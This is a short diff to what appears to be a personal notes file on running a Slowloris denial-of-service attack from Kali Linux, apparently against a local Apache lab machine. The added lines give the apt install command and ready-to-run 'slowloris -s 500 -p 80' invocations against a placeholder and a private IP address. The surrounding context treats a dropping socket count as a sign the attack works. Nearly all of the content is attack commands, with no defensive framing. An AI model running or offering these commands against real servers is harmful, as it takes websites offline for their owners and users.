@@ -25,6 +25,13 @@ pythons slowloris.py -s 500 -p 80 ip
 [and input socket came less then given, it means your 
 attack is working ]
 ===================================
+or 
+sudo apt install slowloris
+-----------------------------------
+slowloris -s 500 -p 80 ip 
+-----------------------------------
+slowloris -s 500 192.168.176.128
+----------------------------------
 ======-============================
 install apache on kali [defalt in kali]
 ----------------------------------
